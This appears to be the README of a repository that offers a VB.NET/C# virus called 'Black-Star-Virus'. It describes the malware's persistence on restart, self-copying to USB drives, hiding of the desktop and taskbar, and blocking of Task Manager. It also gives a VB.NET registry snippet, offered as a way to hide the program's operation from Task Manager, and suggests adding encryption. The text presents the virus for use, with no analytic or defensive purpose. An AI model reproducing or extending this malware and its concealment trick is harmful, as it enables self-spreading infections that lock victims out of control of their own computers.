# Black-Star-Virus
DO NOT DEBUG>>>YOU WILL BE SCREWED IF YOU DO. Just build or use in virtual desktop.
You do not want to mess with this virus unless you are an experienced programmer in VB.NET or C# It will activate itself on system restart/copy itself to USB PORTS/Hide your desktop/Hide your task Bar and it won't allow you to get into Task manager.
Use this with the program if you wish:

Dim theKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", True)
        theKey.SetValue("Hidden", 1) 'Value 1 is visible 2 is invisble
 theKey.Close()
 
 It will turn the program invisible in task manager. You won't see its operation. You could also add encryption if you wanted. 
